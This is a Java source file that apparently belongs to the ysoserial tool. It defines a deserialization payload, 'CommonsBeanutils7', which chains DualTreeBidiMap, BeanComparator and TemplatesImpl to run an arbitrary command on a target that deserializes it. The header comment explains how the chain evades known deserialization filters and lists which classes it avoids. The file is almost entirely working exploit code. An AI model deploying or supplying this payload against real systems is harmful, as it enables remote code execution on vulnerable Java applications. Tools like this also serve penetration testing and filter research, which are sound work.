package ysoserial.payloads;

import java.io.Serializable;

import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.bidimap.DualTreeBidiMap;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	CommonsBeanutils via DualTreeBidiMap — bypasses PQ, TreeBag, TreeMap, CSLM filters.
	NO commons-collections dependency on the target.

	Gadget chain:
		ObjectInputStream.readObject()
			DualTreeBidiMap.readObject()
				DualTreeBidiMap.createBidiMap()    // creates internal TreeMaps
				TreeMap.put(key, value)
					TreeMap.compare()
						BeanComparator.compare()
							PropertyUtils.getProperty(templates, "outputProperties")
								TemplatesImpl.getOutputProperties()
									TemplatesImpl.newTransformer()
										... -> RCE

	Filter evasion:
		1. DualTreeBidiMap (o.a.c.c4.bidimap) — not in any known filter
		2. No PriorityQueue/TreeBag/TreeMap/TreeSet/HashMap/HashSet/CSLM/PBQ
		3. No commons-collections classes in serialized payload
		4. No InvokerTransformer — only BeanComparator + PropertyUtils

	Construction technique:
		CC4's TransformingComparator + InvokerTransformer("toString") used ONLY during
		construction to safely insert TemplatesImpl keys.
		Before serialization, the comparator field is swapped to
		BeanComparator("outputProperties"). CC4 classes are NOT serialized.

	Discovered by IOCD static analysis + differential fuzzing.

	Requires:
		commons-beanutils 1.9.x
		No commons-collections needed on target!
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2"})
@Authors({ Authors.DMBS335 })
public class CommonsBeanutils7 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String command) throws Exception {
		Object templates1 = Gadgets.createTemplatesImpl(command);
		Object templates2 = Gadgets.createTemplatesImpl(command);

		// Safe comparator for construction — CC4 classes used only at build time
		InvokerTransformer safeTransformer = new InvokerTransformer(
			"toString", new Class[0], new Object[0]);
		TransformingComparator safeComp = new TransformingComparator(safeTransformer);

		// DualTreeBidiMap with TemplatesImpl keys
		DualTreeBidiMap bidi = new DualTreeBidiMap(safeComp, safeComp);
		bidi.put(templates1, "a");  // first — no compare
		bidi.put(templates2, "b");  // second — compare via toString, safe

		// Armed comparator — String.CASE_INSENSITIVE_ORDER avoids CC3 dependency
		BeanComparator beanComp = new BeanComparator(
			"outputProperties", String.CASE_INSENSITIVE_ORDER);

		// Swap comparator — only BeanComparator is serialized, no CC4 classes
		Reflections.setFieldValue(bidi, "comparator", beanComp);
		// valueComparator handles reverse map keys (strings "a","b") — safe comparator OK
		Reflections.setFieldValue(bidi, "valueComparator", String.CASE_INSENSITIVE_ORDER);

		return bidi;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutils7.class, args);
	}
}
